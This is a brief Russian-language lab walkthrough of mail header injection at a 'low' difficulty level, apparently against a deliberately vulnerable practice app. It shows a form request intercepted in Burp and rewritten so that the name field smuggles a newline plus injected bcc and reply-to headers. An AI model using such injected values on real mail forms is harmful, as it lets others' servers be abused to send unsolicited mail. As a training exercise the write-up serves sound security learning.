---
title: Mail_Header_Injection_SMTP
sidebar_position: 1
---

# Mail Header Injection (SMTP)

**(low)**


Заполняем форму и перехватываем все burp’ом

![](images/Mail_Header_Injection_SMTP_img_1.png)

После меняем нижнюю строку с

name=test&email=test%40gmail.com&remarks=hello&form=submit

на

name=test\nbcc=hello@gmail.com&reply-to=welocome to bcc age&email=test%40gmail.com&remarks=hello+there+%21&form=submit

и получаем

![](images/Mail_Header_Injection_SMTP_img_2.png)